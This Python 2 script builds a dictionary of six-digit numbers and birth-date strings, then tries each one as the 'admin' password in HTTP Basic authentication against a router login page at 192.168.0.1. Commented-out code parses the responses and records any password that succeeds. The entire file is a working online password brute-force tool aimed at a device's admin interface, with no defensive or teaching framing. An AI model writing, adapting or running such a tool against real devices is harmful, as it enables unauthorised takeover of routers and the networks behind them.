# -*- coding: utf-8 -*-

import base64
import re
from app.NetProcess import NetProcess

def create_password_dict():
    birth_year_range_full = (1940, 2017)
    birth_year_range_brief = (0, 100)
    birth_month_range = (1, 13)
    birth_day_range = (1, 32)
    lower_letter_range = ('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                          'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z')
    upper_letter_range = ('A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L',
                          'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z')

    #生日
    with open('password_dict.txt', 'a+') as f1:
        #6位纯数字
        for i in range(1, 1000000):
            num_str = '%06i' % i
            if not (int(num_str[0:2]) in range(0, 100) and int(num_str[2:4]) in range(1, 13) and int(num_str[4:6]) in range(1, 32)):
                f1.writelines('%s\n' % num_str)

        #生日简写
        for year in range(birth_year_range_brief[0], birth_year_range_brief[1]):
            for month in range(birth_month_range[0], birth_month_range[1]):
                for day in range(birth_day_range[0], birth_day_range[1]):
                    birth_str = '%02i%02i%02i\n' % (year, month, day)
                    f1.writelines(birth_str)

        #生日全
        for year in range(birth_year_range_full[0], birth_year_range_full[1]):
            for month in range(birth_month_range[0], birth_month_range[1]):
                for day in range(birth_day_range[0], birth_day_range[1]):
                    birth_str = '%04i%02i%02i\n' % (year, month, day)
                    f1.writelines(birth_str)



def build_pass(password):
    a = 'admin:%s' % password
    b = base64.b64encode(a)
    base_str = "Basic " + b
    return base_str


def check_pass(password):
    base = build_pass(password)
    net = NetProcess()
    dic = {'Authorization': base, 'platform': 'pc'}
    str_dic = str(dic)
    net.SetCookie(str_dic)
    res = net.GetResFromRequest('GET', 'http://192.168.0.1', encodemethod='gb2312')
    print res
    # if 'error' in res:
    #     check_pass(password)
    #     return 0
    # res = res[:300]
    # a = re.findall(r'httpAutErrorArray=new Array[\(][\r\n](\d+)', res)
    # if len(a) == 0:
    #     with open('pass_result.txt', 'a+') as f1:
    #         f1.writelines('password: %s\r\n' % password)
    #         f1.close()
    # else:
    #     num = a[0]
    #     if num == '1' or num == '2':
    #         print 'password: %s checked' % password
    #         return 0
    #     else:
    #         with open('pass_result.txt', 'a+') as f1:
    #             f1.writelines('password: %s' % password)
    #             f1.close()


def read_and_do():
    with open('password_dict.txt', 'r') as f1:
        for line in f1.readlines():
            check_pass(line)


# read_and_do()

# check_pass('123456345')

# print build_pass('123456qq')

check_pass('123456qq')